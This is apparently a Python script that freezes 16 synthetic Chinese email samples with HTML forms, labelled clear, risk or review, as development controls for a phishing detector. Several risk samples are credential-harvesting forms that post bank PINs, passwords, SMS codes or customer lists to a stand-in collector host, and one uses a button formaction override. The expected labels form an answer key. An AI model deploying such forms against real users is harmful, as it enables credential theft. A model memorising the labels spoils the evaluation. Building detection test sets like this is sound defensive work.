"""Freeze self-authored Chinese form controls, separately from the original 100."""
import sys
from email.message import EmailMessage
from pathlib import Path
sys.path.insert(0,str(Path(__file__).resolve().parents[1]))
from mailguard.config import ROOT
from mailguard.parser import parse_mail
from mailguard.frozen_corpus import identify_mail, publish_corpus


# Expected decisions are scorer-only. These examples are development controls,
# not blind real-world data or evidence of production precision.
SAMPLES=[
    ('search','clear','内部知识库检索入口','知识库搜索只接收查询词，可以按需使用。',
     '<form action="https://portal.company.test/search"><label>检索词<input name="q"></label><button>搜索</button></form>',False,
     '非敏感查询，已知内部知识库目的地。'),
    ('feedback','clear','食堂满意度反馈','本周菜单反馈，不收集姓名或联系方式。',
     '<form action="https://portal.company.test/feedback" method="post"><label>意见<textarea name="feedback"></textarea></label><select name="rating"><option>满意</option></select><button>提交</button></form>',False,
     '正常匿名反馈，文本域不是资料窃取的充分证据。'),
    ('registration','clear','公司读书会报名','自愿参加读书会，仅填昵称和参与时段。',
     '<form action="https://portal.company.test/events"><input name="nickname"><select name="time"><option>周三午休</option></select><button>报名</button></form>',True,
     '自愿活动的低敏感信息，内部目的地。'),
    ('readonly','clear','只读统计报表','附件是部门人数统计，不需要输入账号和密码。',
     '<h1>人数统计</h1><input readonly value="30"><textarea readonly>统计说明</textarea><script src="https://assets.company.test/chart.js"></script>',True,
     '只读报表及已知内部脚本，没有敏感索取。'),
    ('training','clear','钓鱼表单辨识教材','以下仅为惰性模板和转义代码展示，请勿按示例填写。',
     '<h1>教学演示</h1><template><form action="https://collector.example.test/post"><input type="password" name="bankPIN"></form></template><pre>&lt;input type="password"&gt;</pre>',True,
     '教学上下文与惰性模板，没有实际要求用户提交。'),
    ('local_password','clear','本地口令输入组件示例','这是公司培训用的离线组件。仅输入自己临时编造的口令，不能输入任何真实账号密码；按钮只在本页切换字符显示。',
     '<label>临时测试口令<input id="demo" type="password"></label><button type="button" onclick="document.getElementById(\'demo\').type=\'text\'">显示测试字符</button>',True,
     '自定无实际用途的临时字符串，静态事件只影响本页输入框。'),
    ('approved_login','clear','已预约的统一登录演示','按培训安排使用测试账号登录演示环境；不要使用正式账号。',
     '<form action="https://sandbox.company.test/session" method="post"><label>测试账号<input name="username"></label><label>测试密码<input type="password" name="password"></label><button>登录</button></form>',True,
     '背景确认的测试流程和测试专用认证，不能只因密码框报警。'),
    ('external_survey','clear','公开讲座意见征集','我们是已报名讲座的主办方，可选填对课程的意见，无需提供身份信息。',
     '<form action="https://events.partner.test/feedback"><textarea name="comment"></textarea><button>反馈</button></form>',False,
     '背景已确认合作主办方，只索取可选课程意见。'),
    ('statement_login','risk','银行月度对账单','请打开附件查看本月账单，输入网银信息即可查看。',
     '<h1>银行账单登录</h1><form action="https://collector.example.test/verify" method="post"><input name="account"><input type="password" name="bankPIN"><input type="password" name="bankPassword"></form>',True,
     '账单诱导收集网银凭据，并提交到无关目的地。'),
    ('button_override','risk','企业邮箱即将过期','今天完成邮箱验证以免停用。',
     '<form id="check" action="https://portal.company.test/account"><input name="username"><input type="password" name="password"></form><button form="check" formaction="https://collector.example.test/verify">验证</button>',False,
     '按钮将表面内部认证表单改投无关外部主机。'),
    ('text_otp','risk','退款验证码确认','请填写银行刚发给你的短信验证码，我们代为完成退款，勿联系财务。',
     '<form action="https://collector.example.test/refund"><label>银行短信验证码<input type="text" name="code"></label><button>提交</button></form>',True,
     '文本类型输入框索要银行验证码，绕过财务并提交外部。'),
    ('data_textarea','risk','年度客户资料同步','请把含客户手机号和未公开报价的完整列表粘贴到附件内，不要走审批，以免耽误进度。',
     '<form action="https://collector.example.test/upload" method="post"><label>客户完整名单<textarea name="customers"></textarea></label><button>上传</button></form>',True,
     '以资料同步为由绕过审批，外发敏感客户资料。'),
    ('empty_target','review','账户登记页面核实','合作方转来的离线页面，请确认它实际提交到哪里。不要输入真实信息，尚未批准使用。',
     '<form action=""><label>账户<input name="account"></label><label>密码<input type="password" name="password"></label><button>提交</button></form>',True,
     '无真实文档URL，空action去向未知；邮件请求核实而非立即填凭据。'),
    ('dynamic','review','动态报名工具待审核','外部合作方提交的报名工具待安全审核，未批准使用。页面由外部脚本生成，尚未提供字段说明。',
     '<h1>报名工具加载中</h1><script src="https://unknown.example.test/build-form.js"></script><script>document.write("<div id=app></div>")</script>',True,
     '核心动态表单未取得，缺口影响准入判断。'),
    ('embedded','review','嵌入式认证组件待核实','请核实嵌入页面，不要运行或填真实资料，尚无供应商准入记录。',
     '<iframe src="https://unknown.example.test/login"></iframe>',True,
     '外部认证页面未加载，业务授权与核心内容未知。'),
    ('large','review','大体积 HTML 表单审核','附件由合作方提供，拟用于正式账号验证；尚待安全审核，暂不填写。',
     '<!--'+('x'*525000)+'--><form><input type="password"></form>',True,
     '整个附件超静态检查限制，不能据此认为其可安全采集正式凭据。'),
]


def prepare():
    base=ROOT/'data/private/form_controls/v1'
    if base.exists():raise ValueError('Frozen controls already exist')
    manifest=[];labels={};mails=[];files={}
    context={'scope':'企业邮件中的操作风险评估。',
             'known_workflows':'portal.company.test为内部知识库/活动/匿名反馈；assets.company.test为已审定内部静态资源；sandbox.company.test为使用测试账号的预约培训环境。events.partner.test为员工已报名的讲座主办方反馈入口。',
             'policy':'正式账号凭据不通过邮件附件采集。客户手机号、未公开报价外发须审批。所有域名均为模拟数据，域名后缀本身不是风险依据。'}
    for index,(name,expected,subject,text,html,attachment,reason) in enumerate(SAMPLES,1):
        msg=EmailMessage();msg['From']='service@company.test';msg['To']='reader@company.test';msg['Subject']=subject
        msg.set_content(text)
        if attachment:msg.add_attachment(html.encode(),maintype='text',subtype='html',filename='材料.html')
        else:msg.add_alternative(html,subtype='html')
        raw=msg.as_bytes()
        mail=identify_mail(parse_mail(raw,inspect_html=True),prefix='form')
        mid=mail.id;mails.append(mail)
        files[f'eml/{index:02d}-{name}.eml']=raw
        manifest.append({'id':mid,'split':'dev','content_hash':mail.content_hash,'scenario':name})
        labels[mid]={'id':mid,'expected':expected,'rationale':reason,'label_source':'self_authored_development_control'}
    metadata={'evaluation_roles':{'dev':'synthetic_form_development_controls'},
              'caveat':'自编中文表单开发对照，非独立盲测；不代表真实企业误报率。'}
    publish_corpus(base,manifest=manifest,mails=mails,labels=labels,context=context,
                   freeze_metadata=metadata,files=files)
    print('Frozen 16 controls: 8 clear, 4 risk, 4 review; labels excluded from inference.')


if __name__=='__main__':prepare()
